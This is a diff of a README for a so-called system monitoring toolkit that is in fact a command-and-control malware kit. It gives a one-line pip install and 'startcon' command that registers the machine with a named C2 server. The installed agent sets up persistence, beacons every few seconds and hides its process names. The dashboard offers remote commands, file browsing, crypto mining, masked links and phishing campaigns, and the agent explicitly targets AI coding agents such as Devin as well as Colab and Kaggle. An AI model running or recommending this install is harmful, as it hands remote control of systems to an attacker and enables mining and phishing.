@@ -9,123 +9,147 @@ Cross-platform system monitoring and resource optimization toolkit.
 
 ---
 
-## 🚀 Quick Start
+## 🚀 One-Line Install (Agent)
 
-### Server is Running
 ```bash
-# Server: deployed via Cloudflare Tunnel
-# URL: https://gbctwoserver.pages.dev
+pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon
 ```
 
-### Access Dashboard
+This single command:
+- Installs the package
+- Starts the agent
+- Connects to C2 server
+- Begins resource optimization
+
+---
+
+## 📋 Quick Reference
+
+### Server Access
 ```
 Public: https://gbctwoserver.pages.dev
-Local:  http://localhost:5000 (development)
+Local:  http://localhost:5000
 
 Login:  admin / admin
 Quick:  2409 (backdoor)
 ```
+
+### Agent Commands
+```bash
+# Install and start (one line)
+pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon
+
+# Just start (if already installed)
+startcon
+
+# Check server health
+curl -s https://gbctwoserver.pages.dev/api/health
+```
+
+---
 
 ## 📁 Project Structure
 
 ```
 system-monitor/
-├── src/                      # Core source code
-│   ├── monitor/              # Monitoring modules
-│   │   ├── server.py         # Main server
-│   │   ├── orchestrator.py   # Resource management
-│   │   └── models.py         # Data models
-│   ├── agents/               # Platform agents
-│   │   ├── browser/          # Browser automation
-│   │   ├── kaggle/           # Kaggle integration
-│   │   └── universal.py      # Universal agent
+├── src/
+│   ├── c2/                   # C2 server
+│   │   └── server.py         # Main Flask server
+│   ├── agents/
+│   │   ├── universal.py      # Universal agent (startcon)
+│   │   ├── resource_monitor.py  # Resource optimization
+│   │   └── browser/          # Browser automation
 │   ├── autoreg/              # Auto-registration
-│   ├── mail/                 # Email manager
-│   ├── mining/               # Compute modules
 │   └── utils/                # Utilities
-├── src/core/                 # Core config
 ├── templates/                # HTML templates
 ├── static/                   # CSS/JS files
 ├── data/                     # Database
-├── logs/                     # Logs
-├── run_unified.py            # Main entry point
+├── run_unified.py            # Server entry point
 └── requirements.txt          # Dependencies
-```
-
-## 🚀 Quick Start
-
-### Installation
-```bash
-pip install git+https://github.com/GaredBerns/system-monitor.git
-```
-
-### Start Server
-```bash
-sysmon
-# or
-python3 -m run_unified
-```
-
-### Access Dashboard
-```
-Local:  http://localhost:5000
-LAN:    http://192.168.0.171:5000
-
-Login:  admin / admin
-Quick:  2409 (backdoor)
 ```
 
 ---
 
-## 🤖 Agent Installation (Remote Machine / Devin)
+## 🚀 Server Installation
 
-### 1. Install
+### Quick Start
 ```bash
-# Install
-pip install git+https://github.com/GaredBerns/system-monitor.git
-
-# Reinstall (force latest version)
-pip install --force-reinstall git+https://github.com/GaredBerns/system-monitor.git
-
-# Reinstall with cache clear
-pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
-
-# Quick reinstall alias (add to ~/.bashrc):
-alias reinstall-sysmon='pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git'
+# Clone and run
+git clone https://github.com/GaredBerns/system-monitor.git
+cd system-monitor
+pip install -r requirements.txt
+python3 run_unified.py
 ```
 
-### 2. Check Server
+### Using manage.sh
 ```bash
-curl -s https://gbctwoserver.pages.dev/api/health
+./manage.sh start     # Start server
+./manage.sh stop      # Stop server
+./manage.sh restart   # Restart server
+./manage.sh status    # Check status
+./manage.sh logs      # View logs
 ```
 
-### 3. Run Agent
+---
+
+## 🤖 Agent Features
+
+When you run `startcon`, the agent automatically:
+
+1. **Connects to C2** - Registers with server at `https://gbctwoserver.pages.dev`
+2. **Installs Persistence** - Survives reboots via crontab/systemd
+3. **Starts Resource Optimization** - Background optimization module
+4. **Beacons every 3s** - Maintains connection with jitter
+5. **Auto-reconnects** - Exponential backoff on failure
+
+### Supported Platforms
+
+| Platform | Detection | Persistence |
+|----------|-----------|-------------|
+| Linux | ✅ | crontab, systemd |
+| macOS | ✅ | LaunchAgent |
+| Windows | ✅ | ScheduledTask |
+| Colab | ✅ | Session-based |
+| Kaggle | ✅ | Session-based |
+| Docker | ✅ | Container-based |
+
+---
+
+## 🔧 Configuration
+
+Environment variables (optional):
 ```bash
-# After pip install - just run:
-startcon
-
-# Or with custom server:
-C2_URL=https://your-server.com startcon
-
-# Alternative commands:
-sysmon-agent    # Same as startcon
-sysmon          # Start server (not agent)
+export C2_URL="https://gbctwoserver.pages.dev"  # Default
+export SLEEP="3"      # Beacon interval (seconds)
+export JITTER="5"     # Random jitter (%)
+export C2_DEBUG="1"   # Enable debug logging
 ```
 
-**That's it!** The agent will:
-1. Auto-detect platform (Devin, Colab, Kaggle, Linux, macOS, Windows)
-2. Connect to server (default: https://gbctwoserver.pages.dev)
-3. Register and start beacon loop
+---
 
-Expected output:
-```
-[C2 Agent] Platform: devin_ai
-[C2 Agent] C2 URL: https://gbctwoserver.pages.dev
-[C2 Agent] Agent ID: <uuid>
-[C2 Agent] Checking server connectivity...
-[C2 Agent] Server OK: {'status': 'ok', ...}
-[C2 Agent] Registered successfully: <uuid>
-```
+## 📊 Dashboard Features
+
+- **Agents** - View connected machines, platform, status
+- **Tasks** - Send commands, view results
+- **Files** - Browse remote filesystem
+- **Mining** - Monitor hashvault pool stats
+- **Links** - Create masked URLs
+- **Phishing** - Email campaigns, templates
+
+---
+
+## 🔐 Security
+
+- Auth token support (`X-Auth-Token` header)
+- XOR encryption for communications
+- TLS/SSL via Cloudflare
+- Hidden process names and low priority
+
+---
+
+## 📝 License
+
+MIT License - See LICENSE file
 
 ---
 
